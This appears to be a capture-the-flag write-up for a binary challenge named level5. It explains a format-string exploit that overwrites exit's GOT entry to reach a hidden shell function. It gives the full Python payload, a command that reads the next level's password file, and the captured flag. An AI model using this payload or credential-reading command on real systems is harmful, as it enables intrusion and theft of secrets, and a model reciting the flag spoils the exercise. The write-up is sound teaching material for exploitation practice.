# level5

This executable shows a function `o`, uncalled, that runs `system("/bin/sh")`

To solve, we'll have to call `o` anyway. How can we do that ?

The `GOT` (Global Offset Table) holds the addresses of included functions ; by changing a value there, we can call whatever we want.

The `n` function, called by `main`, runs `exit` at the end. We decide to replace `exit`'s GOT address with `o`.

## The value

Cutter reveals the address of `o`, our spoofed value : `0x080484a4`.

This can be broken down in four :
- `0x08` or `8`
- `0x04` or `4`
- `0x84` or `132`
- `0xa4` or `164`

## The address

Cutter's green bar at the top allows us to skim through the important part. At the end, we find `.got.plt` and go to it.

```
;-- exit:
0x08049838      .dword 0x080483d6  ; RELOC 32 exit
```

It reveals the address at which `exit` is referenced : `0x08049838`

Fortunately, its value, `0x080483d6`, already shares two bytes with the value we want, `0x080484a4`. We'll just need to change bytes #3 and #4.

## The buffer

Quick experimentation reveals the beginning of the buffer is at spot `%4$`.

Since our smallest `n` value is `132`, we can start with the addresses.

We write `132` bytes, including our two addresses at places #4 and #6, our `%6$hhn`, `32` more bytes to get to `164`, and finally our `%4$hhn`.

## The exploit

We turn that into something we can output in Python :

```
python -c 'print("\x38\x98\x04\x08____\x39\x98\x04\x08________________________________________________________________________________________________________________________%6$hhn________________________________%4$hhn")'
```

## The flag

Now we just have to format this to send it to our executable :

```
( python -c 'print("\x38\x98\x04\x08____\x39\x98\x04\x08________________________________________________________________________________________________________________________%6$hhn________________________________%4$hhn")' ; echo 'cat /home/user/level6/.pass' ) | ./level5
```

It works ! We get the `level5` flag :

```
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```